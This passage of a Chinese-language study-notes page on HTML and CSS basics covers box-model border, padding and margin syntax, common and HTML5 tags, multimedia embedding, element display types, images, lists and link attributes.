plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background: background-color | background-image[ | background-position | background-repeat | background-attachment ]</span><br></pre></td></tr></table></figure><h2 id="盒子模型"><a href="#盒子模型" class="headerlink" title="盒子模型"></a>盒子模型</h2><h3 id="边框风格"><a href="#边框风格" class="headerlink" title="边框风格"></a>边框风格</h3><p>属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">border-style</span><br><span class="line">border-bottom-style</span><br><span class="line">border-left-style</span><br><span class="line">border-right-style</span><br><span class="line">border-top-style</span><br></pre></td></tr></table></figure><p>语法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">border-style: style [style] [style] [style] [style];</span><br><span class="line">border-方向-style: style [style] [style] [style];</span><br></pre></td></tr></table></figure><p>参数值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">none        无边框</span><br><span class="line">dotted      点</span><br><span class="line">dashed      虚线</span><br><span class="line">solid       实线</span><br><span class="line">double      双实线</span><br><span class="line">groove      3D凹槽</span><br><span class="line">ridge       3D垄状</span><br><span class="line">inset       内嵌立体边框</span><br><span class="line">outset      外嵌立体边框</span><br><span class="line">inherit     继承父元素</span><br></pre></td></tr></table></figure><p>1个值时设置4个方向<br>2个值时上下/左右<br>3个值时上/左右/下<br>4个值时上/右/下/左</p><h3 id="边框宽度"><a href="#边框宽度" class="headerlink" title="边框宽度"></a>边框宽度</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">border-width</span><br><span class="line">border-bottom-width</span><br><span class="line">border-left-width</span><br><span class="line">border-right-width</span><br><span class="line">border-top-width</span><br></pre></td></tr></table></figure><p>语法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">border-width: width_value [width_value] [width_value] [width_value] | inherit;</span><br><span class="line">border-方向-width: width_value [width_value] [width_value] [width_value] | inherit;</span><br></pre></td></tr></table></figure><h3 id="边框颜色"><a href="#边框颜色" class="headerlink" title="边框颜色"></a>边框颜色</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">border-color</span><br><span class="line">border-bottom-color</span><br><span class="line">border-left-color</span><br><span class="line">border-right-color</span><br><span class="line">border-top-color</span><br></pre></td></tr></table></figure><p>语法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">border-color: color_value [color_value] [color_value] [color_value] | inherit;</span><br><span class="line">border-方向-color: color_value [color_value] [color_value] [color_value] | inherit;</span><br></pre></td></tr></table></figure><h3 id="边框属性"><a href="#边框属性" class="headerlink" title="边框属性"></a>边框属性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">border</span><br><span class="line">border-bottom</span><br><span class="line">border-left</span><br><span class="line">border-right</span><br><span class="line">border-top</span><br></pre></td></tr></table></figure><h3 id="形状"><a href="#形状" class="headerlink" title="形状"></a>形状</h3><p>三角形</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">div &#123;</span><br><span class="line">    width:0;</span><br><span class="line">    height:0;</span><br><span class="line">    border: 20px solid #fff;</span><br><span class="line">    border-left-color: #ff594f;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="盒子内边距"><a href="#盒子内边距" class="headerlink" title="盒子内边距"></a>盒子内边距</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">padding</span><br><span class="line">padding-bottom</span><br><span class="line">padding-left</span><br><span class="line">padding-right</span><br><span class="line">padding-top</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">padding: padding_value [padding_value] [padding_value] [padding_value];</span><br><span class="line">padding-方向: padding_value [padding_value] [padding_value] [padding_value];</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">auto</span><br><span class="line">length</span><br><span class="line">%</span><br><span class="line">inherit</span><br></pre></td></tr></table></figure><p>padding会撑开元素大小</p><h3 id="盒子外边距"><a href="#盒子外边距" class="headerlink" title="盒子外边距"></a>盒子外边距</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">margin</span><br><span class="line">margin-bottom</span><br><span class="line">margin-left</span><br><span class="line">margin-right</span><br><span class="line">margin-top</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">margin: margin_value [margin_value] [margin_value] [margin_value];</span><br><span class="line">margin-方向: margin_value [margin_value] [margin_value] [margin_value];</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">auto</span><br><span class="line">length</span><br><span class="line">%</span><br><span class="line">inherit</span><br></pre></td></tr></table></figure><p>外边距合并</p><h2 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h2><h3 id="段落"><a href="#段落" class="headerlink" title="段落"></a>段落</h3><p><code>&lt;p align=&quot;left/right/center&quot;&gt;段落内容&lt;/p&gt;</code></p><h3 id="换行"><a href="#换行" class="headerlink" title="换行"></a>换行</h3><p><code>&lt;br /&gt;</code></p><h3 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h3><p><code>&lt;hn [align=&quot;&quot;]&gt;标题&lt;/hn&gt; (n=1,2,3,4,5,6)</code></p><h3 id="强调"><a href="#强调" class="headerlink" title="强调"></a>强调</h3><p><code>&lt;strong&gt;文本&lt;/strong&gt;</code><br><strong>文本</strong></p><p><code>&lt;em&gt;文本&lt;/em&gt;</code><br><em>文本</em></p><p><code>&lt;mark&gt;文本&lt;/mark&gt;</code><br><mark>文本</mark></p><h3 id="时间"><a href="#时间" class="headerlink" title="时间"></a>时间</h3><p><code>&lt;time datetime=&quot;2018-10-15 23:23&quot;&gt;晚上11点&lt;/time&gt;</code><br><time datetime="2018-10-15 23:23">晚上11点</time></p><p><code>&lt;time pubdate&gt;2018-10-15 23:23&lt;/time&gt;</code><br><time pubdate>2018-10-15 23:23</time></p><h3 id="装饰性标签"><a href="#装饰性标签" class="headerlink" title="装饰性标签"></a>装饰性标签</h3><p><code>&lt;span&gt;文本&lt;/span&gt;</code><br><span>文本</span></p><h3 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h3><div class="table-container"><table><thead><tr><th style="text-align:center">特殊符号</th><th style="text-align:center">字符实体</th></tr></thead><tbody><tr><td style="text-align:center">空格</td><td style="text-align:center"><code>&amp;nbsp;</code></td></tr><tr><td style="text-align:center">&quot;</td><td style="text-align:center"><code>&amp;quot;</code></td></tr><tr><td style="text-align:center">&amp;</td><td style="text-align:center"><code>&amp;amp;</code></td></tr><tr><td style="text-align:center">&lt;</td><td style="text-align:center"><code>&amp;lt;</code></td></tr><tr><td style="text-align:center">&gt;</td><td style="text-align:center"><code>&amp;gt;</code></td></tr><tr><td style="text-align:center">&middot;</td><td style="text-align:center"><code>&amp;middot;</code></td></tr><tr><td style="text-align:center">&times;</td><td style="text-align:center"><code>&amp;times;</code></td></tr><tr><td style="text-align:center">&sect;</td><td style="text-align:center"><code>&amp;sect;</code></td></tr><tr><td style="text-align:center">&cent;</td><td style="text-align:center"><code>&amp;cent;</code></td></tr><tr><td style="text-align:center">&yen;</td><td style="text-align:center"><code>&amp;yen;</code></td></tr><tr><td style="text-align:center">&pound;</td><td style="text-align:center"><code>&amp;pound;</code></td></tr><tr><td style="text-align:center">&copy;</td><td style="text-align:center"><code>&amp;copy;</code></td></tr><tr><td style="text-align:center">&reg;</td><td style="text-align:center"><code>&amp;reg;</code></td></tr><tr><td style="text-align:center">&trade;</td><td style="text-align:center"><code>&amp;trade;</code></td></tr></tbody></table></div><h2 id="文档结构标签"><a href="#文档结构标签" class="headerlink" title="文档结构标签"></a>文档结构标签</h2><h3 id="lt-header-gt-标签"><a href="#lt-header-gt-标签" class="headerlink" title="&lt;header&gt;标签"></a><code>&lt;header&gt;</code>标签</h3><p>一般放置 站点名称、Logo、导航栏、搜索栏、内容区域标题、作者、发布日期。</p><p>注意:</p><ul><li>可以做为网页或任何元素头部信息</li><li>无个数限制</li><li>不能嵌套<code>&lt;header&gt;</code>和<code>&lt;footer&gt;</code></li></ul><h3 id="lt-article-gt-标签"><a href="#lt-article-gt-标签" class="headerlink" title="&lt;article&gt;标签"></a><code>&lt;article&gt;</code>标签</h3><p><code>&lt;article&gt;独立内容&lt;/article&gt;</code></p><h3 id="lt-section-gt-标签"><a href="#lt-section-gt-标签" class="headerlink" title="&lt;section&gt;标签"></a><code>&lt;section&gt;标签</code></h3><p>分块<br><code>&lt;section&gt;块内容&lt;/section&gt;</code></p><h3 id="lt-main-gt-标签"><a href="#lt-main-gt-标签" class="headerlink" title="&lt;main&gt;标签"></a><code>&lt;main&gt;</code>标签</h3><p>主体内容 不可重复出现<br><code>&lt;main&gt;主体内容&lt;/main&gt;</code></p><h3 id="lt-nav-gt-标签"><a href="#lt-nav-gt-标签" class="headerlink" title="&lt;nav&gt;标签"></a><code>&lt;nav&gt;</code>标签</h3><p><code>&lt;nav&gt;导航条&lt;/nav&gt;</code></p><h3 id="lt-aside-gt-标签"><a href="#lt-aside-gt-标签" class="headerlink" title="&lt;aside&gt;标签"></a><code>&lt;aside&gt;</code>标签</h3><p>侧边栏<br><code>&lt;aside&gt;导航条&lt;/aside&gt;</code></p><h2 id="多媒体标签"><a href="#多媒体标签" class="headerlink" title="多媒体标签"></a>多媒体标签</h2><h3 id="lt-object-gt-标签"><a href="#lt-object-gt-标签" class="headerlink" title="&lt;object&gt;标签"></a><code>&lt;object&gt;</code>标签</h3><ul><li><p>IE9/IE8/IE7/IE6</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;object classid=&quot;clsid_value&quot; codebase=&quot;url&quot; width=&quot;value&quot; height=&quot;value&quot;&gt;</span><br><span class="line">    &lt;param name=&quot;movie&quot; value=&quot;fail_name&quot;&gt;</span><br><span class="line">    &lt;param name=&quot;quality&quot; value=&quot;high&quot;&gt;</span><br><span class="line">    &lt;param name=&quot;wmode&quot; value=&quot;opaque&quot;&gt;</span><br><span class="line">    ...</span><br><span class="line">&lt;/object&gt;</span><br></pre></td></tr></table></figure></li><li><p>IE 10/11 not IE</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;object classid=&quot;clsid_value&quot; codebase=&quot;url&quot; width=&quot;value&quot; height=&quot;value&quot;&gt;</span><br><span class="line">    &lt;param name=&quot;movie&quot; value=&quot;fail_name&quot;&gt;</span><br><span class="line">    &lt;param name=&quot;quality&quot; value=&quot;high&quot;&gt;</span><br><span class="line">    ...</span><br><span class="line">    &lt;!--[if !IE]&gt;--&gt;</span><br><span class="line">    &lt;object type=&quot;media_type&quot; data=&quot;media_fileName&quot; width=&quot;value&quot; height=&quot;value&quot;&gt;</span><br><span class="line">    &lt;!--&lt;!endif]--&gt;</span><br><span class="line">    ...</span><br><span class="line">    &lt;!--[if !IE]&gt;--&gt;</span><br><span class="line">    &lt;/object&gt;</span><br><span class="line">    &lt;!--&lt;![endif]--&gt;</span><br><span class="line">&lt;/object&gt;</span><br></pre></td></tr></table></figure></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">属性</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">classid</td><td style="text-align:center">设置浏览器ActiveX控件</td></tr><tr><td style="text-align:center">codebase</td><td style="text-align:center">设置ActiveX控件的位置，如果浏览器没安装会自动下载安装</td></tr><tr><td style="text-align:center">data</td><td style="text-align:center">在嵌套的object标签中指定嵌入多媒体文件名</td></tr><tr><td style="text-align:center">type</td><td style="text-align:center">嵌套的object标签中这是媒体类型，对动画类型是 application/x-shockwave-flash</td></tr><tr><td style="text-align:center">height</td><td style="text-align:center">以百分比或限速指定嵌入对象高度</td></tr><tr><td style="text-align:center">width</td><td style="text-align:center">以百分比或限速指定嵌入对象宽度</td></tr><tr><td style="text-align:center">name</td><td style="text-align:center">设置参数名称</td></tr><tr><td style="text-align:center">value</td><td style="text-align:center">设置参数值</td></tr><tr><td style="text-align:center">movie</td><td style="text-align:center">指定动画的下载地址</td></tr><tr><td style="text-align:center">quality</td><td style="text-align:center">指定嵌入对象的播放质量</td></tr><tr><td style="text-align:center">wmode</td><td style="text-align:center">设置嵌入对象窗口模式，可取 window/opaque/transparent，其中，window为默认值，表示嵌入对象始终位于HTML顶层，opaque允许嵌入对象上层可以有网页遮挡，transparent 设置 flash背景透明</td></tr></tbody></table></div><h3 id="lt-embed-gt-标签"><a href="#lt-embed-gt-标签" class="headerlink" title="&lt;embed&gt;标签"></a><code>&lt;embed&gt;</code>标签</h3><p>用于Netscape Navigator2.0及以后的浏览器包括IE, Chrome,firefox不支持<br>语法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;embed src=&quot;file_url&quot;&gt; &lt;/embed&gt;</span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th style="text-align:center">属性</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">src</td><td style="text-align:center">文件路径文件类型可以为mp3,mp4,swf</td></tr><tr><td style="text-align:center">width</td><td style="text-align:center">以像素为单位定义嵌入对象宽度</td></tr><tr><td style="text-align:center">height</td><td style="text-align:center">以像素为单位定义嵌入对线高度</td></tr><tr><td style="text-align:center">loop</td><td style="text-align:center">定义嵌入对象是否循环播放,true为循环播放,默认为false</td></tr><tr><td style="text-align:center">hidden</td><td style="text-align:center">设置嵌入对象可视属性,默认false可见</td></tr><tr><td style="text-align:center">type</td><td style="text-align:center">定义嵌入对象MIME类型</td></tr></tbody></table></div><h3 id="lt-video-gt-标签"><a href="#lt-video-gt-标签" class="headerlink" title="&lt;video&gt;标签"></a><code>&lt;video&gt;标签</code></h3><p>支持HTML5的可以用<code>&lt;video&gt; &lt;audio&gt;</code>代替前两个标签</p><p>语法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video src=&quot;file_url&quot;&gt;&lt;/video&gt;</span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th style="text-align:center">属性</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">src</td><td style="text-align:center">指定嵌入对象文件路径</td></tr><tr><td style="text-align:center">autoplay</td><td style="text-align:center">嵌入对象在加载页面后自动播放</td></tr><tr><td style="text-align:center">controls</td><td style="text-align:center">出现该属性则向用户显示控件</td></tr><tr><td style="text-align:center">preload</td><td style="text-align:center">设置视频在页面加载时进行加载，并预备播放，如果同时设置了autoplay则该属性无效</td></tr><tr><td style="text-align:center">muted</td><td style="text-align:center">音频输出静音</td></tr><tr><td style="text-align:center">width</td><td style="text-align:center">以像素为单位定义嵌入对象宽度</td></tr><tr><td style="text-align:center">height</td><td style="text-align:center">以像素为单位定义嵌入对线高度</td></tr><tr><td style="text-align:center">loop</td><td style="text-align:center">定义嵌入对象是否循环播放,true为循环播放,默认为false</td></tr><tr><td style="text-align:center">hidden</td><td style="text-align:center">设置嵌入对象可视属性,默认false可见</td></tr><tr><td style="text-align:center">poster</td><td style="text-align:center">设置视频下载时显示的图像，或者在用户单击播放按钮前显示的图像</td></tr><tr><td style="text-align:center">type</td><td style="text-align:center">定义嵌入对象MIME类型</td></tr></tbody></table></div><h3 id="lt-audio-gt-标签"><a href="#lt-audio-gt-标签" class="headerlink" title="&lt;audio&gt;标签"></a><code>&lt;audio&gt;</code>标签</h3><p>嵌入音频格式包括 mp3,wav,ogg,webm</p><p>语法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;audio src=&quot;file_url&quot; control&gt; &lt;/audio&gt;</span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th style="text-align:center">属性</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">src</td><td style="text-align:center">指定嵌入对象文件路径</td></tr><tr><td style="text-align:center">autoplay</td><td style="text-align:center">嵌入对象在加载页面后自动播放</td></tr><tr><td style="text-align:center">controls</td><td style="text-align:center">出现该属性则向用户显示控件</td></tr><tr><td style="text-align:center">preload</td><td style="text-align:center">设置视频在页面加载时进行加载，并预备播放，如果同时设置了autoplay则该属性无效</td></tr><tr><td style="text-align:center">muted</td><td style="text-align:center">音频输出静音</td></tr><tr><td style="text-align:center">width</td><td style="text-align:center">以像素为单位定义嵌入对象宽度</td></tr><tr><td style="text-align:center">height</td><td style="text-align:center">以像素为单位定义嵌入对线高度</td></tr><tr><td style="text-align:center">loop</td><td style="text-align:center">定义嵌入对象是否循环播放,true为循环播放,默认为false</td></tr><tr><td style="text-align:center">hidden</td><td style="text-align:center">设置嵌入对象可视属性,默认false可见</td></tr><tr><td style="text-align:center">type</td><td style="text-align:center">定义嵌入对象MIME类型</td></tr></tbody></table></div><h2 id="元素类型"><a href="#元素类型" class="headerlink" title="元素类型"></a>元素类型</h2><h3 id="block块级元素"><a href="#block块级元素" class="headerlink" title="block块级元素"></a><code>block</code>块级元素</h3><p>特点</p><ul><li>独占一行</li><li>不设置宽度时自动撑满父元素宽度</li><li>和相邻的块级元素依次垂直排列</li><li>可设置元素宽度高度和四个方向内外边距</li></ul><p>常见的<code>div,o,h1~h6,ul,ol,dt,dd</code><br>HTML5中<code>section,header,footer,nav</code></p><h3 id="inline行内元素"><a href="#inline行内元素" class="headerlink" title="inline行内元素"></a><code>inline</code>行内元素</h3><p>特点</p><ul><li>行内元素从左到右依次排列在同一行里，直到排不下</li><li>不可设置宽度高度</li><li>可以设置四个方向内边距及左右外边距，不可设置上下外边距</li><li>高度由元素高度决定，宽度由内容长度控制。</li></ul><p>常见<code>span,a,em,strong</code><br>HTML5中<code>mark,time</code></p><h3 id="inline-block行内块元素"><a href="#inline-block行内块元素" class="headerlink" title="inline-block行内块元素"></a><code>inline-block</code>行内块元素</h3><p>特点</p><ul><li>从左到右排列在同一行，直到排不下才换行</li><li>可以设置高度和宽度</li><li>可以设置4个方向内外边距</li></ul><p>常见 <code>input,img</code></p><p>问题</p><ul><li>浏览器兼容问题低版本失效(解决方法:<code>display:inline;zoom:1;</code>)</li><li>默认下方有间隙(解决方法:给行内块元素设置<code>vertical-align:middle|top|bottom</code>之一)</li></ul><h3 id="使用display属性改变元素类型"><a href="#使用display属性改变元素类型" class="headerlink" title="使用display属性改变元素类型"></a>使用<code>display</code>属性改变元素类型</h3><div class="table-container"><table><thead><tr><th style="text-align:center">属性</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">none</td><td style="text-align:center">不显示</td></tr><tr><td style="text-align:center">block</td><td style="text-align:center">显示为块级元素</td></tr><tr><td style="text-align:center">inline</td><td style="text-align:center">显示为行内元素</td></tr><tr><td style="text-align:center">inline-block</td><td style="text-align:center">显示为行内块级元素</td></tr><tr><td style="text-align:center">inherit</td><td style="text-align:center">继承父级元素display属性</td></tr></tbody></table></div><h3 id="使用CSS-reset标签样式"><a href="#使用CSS-reset标签样式" class="headerlink" title="使用CSS reset标签样式"></a>使用CSS reset标签样式</h3><p>重置标签默认样式，防止浏览器默认样式不同。</p><h2 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h2><h3 id="常用格式"><a href="#常用格式" class="headerlink" title="常用格式"></a>常用格式</h3><p>JPEG,GIF,PNG</p><h3 id="插入图片基本语法"><a href="#插入图片基本语法" class="headerlink" title="插入图片基本语法"></a>插入图片基本语法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;file_url&quot;&gt;</span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th style="text-align:center">属性</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">alt</td><td style="text-align:center">指定图片的替换信息</td></tr><tr><td style="text-align:center">height</td><td style="text-align:center">高度</td></tr><tr><td style="text-align:center">width</td><td style="text-align:center">宽度</td></tr><tr><td style="text-align:center">title</td><td style="text-align:center">提示信息</td></tr></tbody></table></div><p><code>border,align</code>属性建议使用CSS设置</p><p>取消小空隙</p><ul><li>设置父元素高度</li><li>添加垂直对齐样式</li></ul><h3 id="使用CSS设置样式"><a href="#使用CSS设置样式" class="headerlink" title="使用CSS设置样式"></a>使用CSS设置样式</h3><p><code>vertical-align: align_value;</code></p><div class="table-container"><table><thead><tr><th style="text-align:center">参数</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">length</td><td style="text-align:center">以px,em为单位,可取正负值。正值表示相对于基线升高的，负值表示相对于基线降低的</td></tr><tr><td style="text-align:center">%</td><td style="text-align:center">相对于继承的line-height百分数，可取正负值，同上。</td></tr><tr><td style="text-align:center">baseline</td><td style="text-align:center">默认对齐方式，基线与父元素基线对齐</td></tr><tr><td style="text-align:center">bottom</td><td style="text-align:center">底端对齐</td></tr><tr><td style="text-align:center">text-bottom</td><td style="text-align:center">底部与父元素文本底部对齐</td></tr><tr><td style="text-align:center">middle</td><td style="text-align:center">居中对齐</td></tr><tr><td style="text-align:center">top</td><td style="text-align:center">顶部对齐</td></tr><tr><td style="text-align:center">text-top</td><td style="text-align:center">顶部与文本对齐</td></tr></tbody></table></div><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><h3 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h3><p>语法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;ol&gt;</span><br><span class="line">    &lt;li&gt;p_1&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;p_2&lt;/li&gt;</span><br><span class="line">    ...</span><br><span class="line">&lt;/ol&gt;</span><br></pre></td></tr></table></figure><p>项目符号<br><code>&lt;ol type=&quot; &quot;&gt;</code></p><div class="table-container"><table><thead><tr><th style="text-align:center">参数</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center">1,2,3</td></tr><tr><td style="text-align:center">a</td><td style="text-align:center">a,b,c</td></tr><tr><td style="text-align:center">A</td><td style="text-align:center">A,B,C</td></tr><tr><td style="text-align:center">i</td><td style="text-align:center">i,ii,iii</td></tr><tr><td style="text-align:center">I</td><td style="text-align:center">I,II,III</td></tr></tbody></table></div><h3 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h3><p>语法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li&gt;p_1&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;p_2&lt;/li&gt;</span><br><span class="line">    ...</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure><p>项目符号<br><code>&lt;ul type=&quot;&quot;&gt;</code></p><div class="table-container"><table><thead><tr><th style="text-align:center">参数</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">disc</td><td style="text-align:center">实心圆点(默认)</td></tr><tr><td style="text-align:center">circle</td><td style="text-align:center">空心圆点</td></tr><tr><td style="text-align:center">squatr</td><td style="text-align:center">实心方块</td></tr></tbody></table></div><h3 id="定义列表"><a href="#定义列表" class="headerlink" title="定义列表"></a>定义列表</h3><p>语法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;dl&gt;</span><br><span class="line">&lt;dt&gt;noun_1&lt;/dt&gt;</span><br><span class="line">    &lt;dd&gt;explain_1&lt;/dd&gt;</span><br><span class="line">    &lt;dd&gt;explain_2&lt;/dd&gt;</span><br><span class="line">    ...</span><br><span class="line">&lt;dt&gt;noun_2&lt;/dt&gt;</span><br><span class="line">    &lt;dd&gt;explain_1&lt;/dd&gt;</span><br><span class="line">    ...</span><br><span class="line">&lt;/dl&gt;</span><br></pre></td></tr></table></figure><p>无项目符号</p><h3 id="使用CSS列表属性设置列表样式"><a href="#使用CSS列表属性设置列表样式" class="headerlink" title="使用CSS列表属性设置列表样式"></a>使用CSS列表属性设置列表样式</h3><div class="table-container"><table><thead><tr><th style="text-align:center">属性</th><th style="text-align:center">参数</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">list-style</td><td style="text-align:center">其他任意列表参数</td><td style="text-align:center">简写属性</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">disc</td><td style="text-align:center">实心圆点</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">circle</td><td style="text-align:center">空心圆点</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">square</td><td style="text-align:center">实心方块</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">decimal</td><td style="text-align:center">阿拉伯数字</td></tr><tr><td style="text-align:center">list-style-type</td><td style="text-align:center">lower-roman</td><td style="text-align:center">小写罗马数字</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">upper-roman</td><td style="text-align:center">大写罗马数字</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">lower-alpha</td><td style="text-align:center">小写英文字母</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">upper-alpha</td><td style="text-align:center">大写英文字母</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">none</td><td style="text-align:center">无项目符号</td></tr></tbody></table></div><h3 id="创建横纵菜单"><a href="#创建横纵菜单" class="headerlink" title="创建横纵菜单"></a>创建横纵菜单</h3><p>横向菜单注意设置<code>display:inline;</code><br>注意取消边框线、项目符号</p><p><code>display:inline-block;</code>可以设置图文横向排列</p><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><h3 id="a标签"><a href="#a标签" class="headerlink" title="a标签"></a><code>a</code>标签</h3><div class="table-container"><table><thead><tr><th style="text-align:center">属性</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">href</td><td style="text-align:center">链接路径</td></tr><tr><td style="text-align:center">target</td><td style="text-align:center">目标窗口</td></tr><tr><td style="text-align:center">title</td><td style="text-align:center">链接提示信息</td></tr></tbody></table></div><p>语法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;url&quot;&gt; text/images &lt;/a&gt;</span><br></pre></td></tr></table></figure></p><p><b>href</b></p><div class="table-container"><table><thead><tr><th style="text-align:center">参数</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">“”(无内容)</td><td style="text-align:center">跳转到页面顶部(search)</td></tr><tr><td style="text-align:center">#</td><td style="text-align:center">跳转到页面顶部(hash)</td></tr><tr><td style="text-align:center">javascript:…;</td><td style="text-align:center">执行javascript脚本</td></tr><tr><td style="text-align:center">URL</td><td style="text-align:center">跳转到指定页面</td></tr></tbody></table></div><p><b>target</b></p><div class="table-container"><table><thead><tr><th style="text-align:center">参数</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">_blank</td><td style="text-align:center">新开窗口打开</td></tr><tr><td style="text-align:center">_self</td><td style="text-align:center">同窗口/框架下打开(默认)</td></tr><tr><td style="text-align:center">_parent</td><td 